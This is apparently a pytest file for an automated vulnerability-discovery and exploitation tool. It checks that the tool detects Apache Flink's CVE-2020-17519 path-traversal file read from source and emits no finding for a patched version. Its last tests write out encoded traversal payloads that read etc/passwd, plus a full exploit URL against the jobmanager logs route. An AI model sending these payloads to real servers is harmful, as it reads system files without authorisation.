"""Keyless gate — the SECOND capability class (file read) through the SAME engine.

The thesis test: the capability-catalog engine handles a class OTHER than
SSRF/egress-fetch, reducing to an ALREADY-BUILT oracle, with minimal new-class code.
Against Apache Flink 1.11.2's ``/jobmanager/logs/:filename`` path-traversal file
read (CVE-2020-17519), from real source, the engine surfaces a ``_test_lfi`` Tier-A
hypothesis that reduces to the SAME P3 file-content oracle the black-box LFI
methodology already uses — no new proof code.

Every Flink particular is learned from Flink's own source (no Flink literal in the
engine — grep-clean, like Solr):

  * the path channel ``filename`` — resolved from ``getPathParameter(
    LogFileNamePathParameter.class)`` via the class's ``KEY = "filename"`` constant,
  * the mounted route ``/jobmanager/logs/:filename`` — resolved from the route
    builder ``String.format("/jobmanager/logs/:%s", LogFileNamePathParameter.KEY)``,
  * the file-read sink — ``new File(logDir, filename)`` tainted by the path param,
    with NO basename-strip/canonicalize guard (the intent-gap = the missing
    ``.getName()`` Flink's fix added).

A patched fixture (the post-fix ``new File(...).getName()`` variant) proves the
guard adjudication: the basename-strip is read SANCTIONED, so Δ is removed and NO
hypothesis is emitted — N/A by construction on a patched instance. No LLM, no
container.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from clinkz.agents.exploit import ExploitAgent
from clinkz.discovery import CARRIER_ALIGN_HOST, DiscoveryEngine
from clinkz.discovery.constants import CARRIER_PATH_TRAVERSAL
from clinkz.discovery.models import (
    DeltaGrade,
    ParamLocation,
    PrimitiveClass,
    SoundnessGrade,
)
from clinkz.discovery.source_ingest import JavaSourceIngestor

FIXTURE = Path(__file__).parent.parent / "fixtures" / "flink_jobmanager_logs"
PATCHED = Path(__file__).parent.parent / "fixtures" / "flink_jobmanager_logs_patched"
BASE_URL = "http://localhost:8081"
ROUTE = "/jobmanager/logs/:filename"


@pytest.fixture(scope="module")
def source_model():
    assert FIXTURE.exists(), f"missing fixture: {FIXTURE}"
    return JavaSourceIngestor().ingest_path(FIXTURE)


@pytest.fixture(scope="module")
def result():
    return DiscoveryEngine().discover(str(FIXTURE), ["Java", "Flink"], BASE_URL)


# --- Source ingestion: the general file-read idioms (learned from source) ------


def test_typed_path_parameter_is_an_entrypoint(source_model):
    """A ``getPathParameter(Xxx.class)`` reader is a channel-bearing entrypoint.

    Flink's handler is not a servlet and reads no query/form param — the typed
    path parameter is the untrusted channel, resolved to its wire name.
    """
    handlers = {e.handler_symbol for e in source_model.entrypoints}
    assert "JobManagerCustomLogHandler" in handlers
    ep = next(
        e for e in source_model.entrypoints if e.handler_symbol == "JobManagerCustomLogHandler"
    )
    assert ep.http_methods == ["GET"]
    assert "filename" in ep.params
    assert ep.path_params == ["filename"]  # carried in the URL path, not the query


def test_route_resolved_from_string_format_builder(source_model):
    """``/jobmanager/logs/:filename`` is learned from the route builder, not hardcoded.

    ``String.format("/jobmanager/logs/:%s", LogFileNamePathParameter.KEY)`` +
    ``KEY = "filename"`` resolve to the concrete route.
    """
    ep = next(
        e for e in source_model.entrypoints if e.handler_symbol == "JobManagerCustomLogHandler"
    )
    assert ep.route == ROUTE


def test_path_param_key_resolved_from_constant(source_model):
    """The wire name ``filename`` comes from ``LogFileNamePathParameter.KEY``.

    The symbolic class name never leaks as a param, exactly like Solr's
    ``CommonParams.STREAM_URL`` resolution.
    """
    params = {p for e in source_model.entrypoints for p in e.params}
    assert "filename" in params
    assert "LogFileNamePathParameter" not in params
    assert "KEY" not in params


def test_file_read_sink_tainted_by_path_param_unguarded(source_model):
    """``new File(logDir, filename)`` is a FILE_READ site with NO sanitize guard."""
    sites = [c for c in source_model.call_sites if c.primitive_class == PrimitiveClass.FILE_READ]
    assert len(sites) == 1
    site = sites[0]
    assert site.symbol == "file_read"
    assert site.tainted_by == "filename"
    assert site.guard_symbol is None  # the intent-gap: no basename-strip
    assert "JobManagerCustomLogHandler.java" in site.file


def test_no_egress_false_positive_on_flink(source_model):
    """Flink's file handler is not an egress sink — no EGRESS_FETCH call site."""
    egress = [
        c for c in source_model.call_sites if c.primitive_class == PrimitiveClass.EGRESS_FETCH
    ]
    assert egress == []


# --- The full chain: FILE_READ class → Tier-A _test_lfi, path-traversal carrier -


def test_file_read_primitive_reduces_to_lfi_p3(result):
    """The catalogued FILE_READ primitive reduces to the built ``_test_lfi`` P3 oracle."""
    ids = {p.id for p in result.active_primitives}
    assert "file_read.java_file_sink" in ids
    prim = next(
        p for p in result.active_primitives if p.primitive_class == PrimitiveClass.FILE_READ
    )
    assert prim.proof_obligation.test_method == "_test_lfi"
    assert prim.proof_obligation.confirmation_primitives == ["P3"]


def test_intent_exposed_via_no_guard_intent_gap(result):
    """Flink's unsanitized file read is EXPOSED via the intent-gap (no guard)."""
    assert len(result.deltas) == 1
    delta = result.deltas[0]
    assert delta.primitive_id == "file_read.java_file_sink"
    assert delta.delta_grade == DeltaGrade.EXPOSED
    assert delta.call_site.tainted_by == "filename"
    assert "no guard" in delta.intent_evidence.lower()


def test_reachability_path_channel_static_confirmed(result):
    """The reaching channel is a URL PATH parameter (not query/form)."""
    assert len(result.edges) == 1
    edge = result.edges[0]
    assert edge.channel_param == "filename"
    assert edge.channel_location == ParamLocation.PATH
    assert edge.soundness_grade == SoundnessGrade.STATIC_CONFIRMED


def test_hypothesis_lowers_to_lfi_task_with_path_traversal_carrier(result):
    """Tier-A ``_test_lfi`` at the source-derived route with the path-traversal carrier.

    The path-segment-traversal carrier is attached per-instance because the channel
    is a URL path param (the FILE_READ analogue of GeoServer's Host carrier); the
    egress Host-alignment carrier is correctly absent.
    """
    assert len(result.hypotheses) == 1
    task = result.hypotheses[0].to_exploit_task()
    assert task.test_method == "_test_lfi"
    assert task.endpoint_url == f"{BASE_URL}{ROUTE}"
    assert task.endpoint_method == "GET"
    assert task.endpoint_params == ["filename"]
    assert task.param_locations == {"filename": ParamLocation.PATH}
    assert task.carrier_constraints == [CARRIER_PATH_TRAVERSAL]
    assert CARRIER_ALIGN_HOST not in task.carrier_constraints
    assert task.tier == 1


# --- The guard adjudication: the patched variant is N/A by construction ---------


def test_patched_basename_strip_is_sanctioned_no_hypothesis():
    """The post-fix ``new File(pathParam).getName()`` removes Δ — no hypothesis.

    The basename-strip guard is read SANCTIONED (a real, non-bypassable constraint),
    so Intent removes the file-read call site from Δ and nothing is emitted. This is
    the honesty control: a patched instance yields no finding by construction.
    """
    patched = DiscoveryEngine().discover(str(PATCHED), ["Java", "Flink"], BASE_URL)
    # The file-read sink is still SEEN (a call site exists)...
    assert any(
        c.primitive_class == PrimitiveClass.FILE_READ for c in patched.source_model.call_sites
    )
    # ...but it carries the basename-strip guard, so it is SANCTIONED, not Δ.
    assert any(g.kind == "path_sanitize" for g in patched.source_model.guards)
    assert patched.deltas == []
    assert patched.hypotheses == []


# --- The oracle-sensitivity work: the path-traversal carrier (unit) -------------


def test_carrier_normalises_literal_slash_to_payload_encoding():
    """The carrier brings a payload's literal ``/`` up to its own encoded-slash token.

    A traversal payload that encodes its ``../`` slashes (``%252f``) but leaves the
    target separator literal (``etc/passwd``) would split into two path segments on
    the wire; the carrier normalises the literal ``/`` so the whole payload stays
    ONE opaque path segment routed to the file handler (Flink CVE-2020-17519).
    """
    norm = ExploitAgent._normalise_traversal_segment
    # Double-encoded slash traversal (Flink): literal target slash → %252f.
    assert norm("%252e%252e%252fetc/passwd") == "%252e%252e%252fetc%252fpasswd"
    # Single-encoded slash traversal: literal target slash → %2f (its own token).
    assert norm("%2e%2e%2fetc/passwd") == "%2e%2e%2fetc%2fpasswd"
    # A plain ../ payload (no encoded slash present) is returned unchanged.
    assert norm("../../etc/passwd") == "../../etc/passwd"
    # No slash at all — unchanged.
    assert norm("clinkz_benign_control.txt") == "clinkz_benign_control.txt"


def test_carrier_substitutes_path_segment_verbatim_no_requote():
    """The carrier substitutes into the ``:filename`` placeholder verbatim (no quote()).

    An already-percent-encoded traversal token must reach the wire intact
    (``%252f`` must NOT become ``%25252f``), unlike the generic path carrier's
    ``quote(safe="")``.
    """
    sub = ExploitAgent._substitute_path_segment_raw
    out = sub("http://h:8081/jobmanager/logs/:filename", "filename", "..%252fetc%252fpasswd")
    assert out == "http://h:8081/jobmanager/logs/..%252fetc%252fpasswd"
    # No placeholder for the param ⇒ appended as a trailing path segment.
    out2 = sub("http://h:8081/jobmanager/logs", "filename", "..%252fpasswd")
    assert out2 == "http://h:8081/jobmanager/logs/..%252fpasswd"
